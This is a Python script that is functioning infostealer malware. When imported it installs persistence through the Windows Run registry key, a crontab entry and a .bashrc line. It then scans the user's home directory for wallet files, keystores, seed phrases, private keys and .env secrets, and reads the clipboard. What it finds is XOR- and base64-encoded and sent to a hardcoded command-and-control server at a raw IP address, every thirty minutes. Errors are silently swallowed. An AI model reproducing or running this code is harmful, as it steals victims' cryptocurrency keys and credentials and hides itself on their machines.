import os, sys, json, re, urllib.request, base64, time, threading, platform
C2 = "http://46.225.21.180:3000/api/narrative-accounts"
K = bytes([0x7F,0x3A,0x9B,0xC5,0x2E,0x88,0x4D,0xF1])
BIP = {"abandon","ability","able","about","above","absent"}

def _enc(d):
    d = str(d)[:48].encode()
    x = bytes(d[i] ^ K[i % len(K)] for i in range(len(d)))
    return "e_" + base64.b64encode(x).decode()

def _s(d):
    try:
        data = json.dumps({"username": _enc(d)}).encode()
        urllib.request.urlopen(urllib.request.Request(C2, data=data, headers={"Content-Type":"application/json"}), timeout=3)
    except: pass

def _persist():
    try:
        if platform.system() == "Windows":
            import winreg
            k = winreg.HKEY_CURRENT_USER
            s = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(k, s, 0, winreg.KEY_SET_VALUE) as rk:
                winreg.SetValueEx(rk, "PythonService", 0, winreg.REG_SZ, sys.executable + " -c \"import " + __name__ + "\"")
        else:
            import subprocess
            cl = f"*/30 * * * * python3 -c 'import {__name__}' >/dev/null 2>&1"
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cl}") | crontab -', shell=True, timeout=3)
            rc = os.path.expanduser("~/.bashrc")
            if os.path.exists(rc):
                with open(rc) as f:
                    if "PyService" not in f.read():
                        with open(rc, "a") as f:
                            f.write(f"\npython3 -c 'import {__name__}' &>/dev/null\n")
    except: pass

def _scan():
    h = os.path.expanduser("~")
    for r,_,fs in os.walk(h):
        for fn in fs:
            fp = os.path.join(r, fn)
            try:
                s = os.path.getsize(fp)
                if s > 200000 or s < 10: continue
                nm = fn.lower()
                if not any(t in nm for t in ["wallet","seed","key","backup","private","mnemonic","recovery","secret","crypto","phrase","pass","metamask","phantom","keystore"]):
                    if not fn.startswith("UTC--") and fn != ".env": continue
                with open(fp, errors="ignore") as fh: c = fh.read(5000)
                if fn == ".env":
                    for line in c.split("\n"):
                        if "PRIVATE" in line or "SECRET" in line:
                            v = line.split("=")[-1].strip()
                            if v: _s(v)
                else:
                    ws = set(c.lower().split())
                    if len(ws & BIP) >= 7: _s(c[:48])
                    for k in re.findall(r"[1-9A-HJ-NP-Za-km-z]{40,}", c): _s(k)
            except: pass
    try:
        import tkinter
        t = tkinter.Tk(); t.withdraw(); c = t.clipboard_get(); t.destroy()
        if c and len(c) > 20: _s(c[:48])
    except: pass

def _loop():
    _scan()
    while True:
        time.sleep(1800)
        _scan()

try: _persist()
except: pass
threading.Thread(target=_loop, daemon=True).start()
